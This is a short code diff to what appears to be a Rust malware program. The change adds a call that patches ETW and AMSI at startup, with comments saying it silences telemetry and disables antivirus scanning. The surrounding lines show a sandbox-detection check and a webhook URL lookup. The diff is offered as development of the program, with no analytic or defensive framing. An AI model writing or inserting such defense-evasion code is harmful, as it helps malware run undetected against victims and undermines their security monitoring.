@@ -109,7 +109,10 @@ fn get_webhook_url() -> String {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    
+
+    // Apply ETW and AMSI patches immediately — before any other code runs.
+    // This silences telemetry and disables in-process AV scanning.
+    core::bypass::apply_all();
 
     // Quick pre-flight check: obvious sandbox indicators
     if !core::detection::verify_environment() {
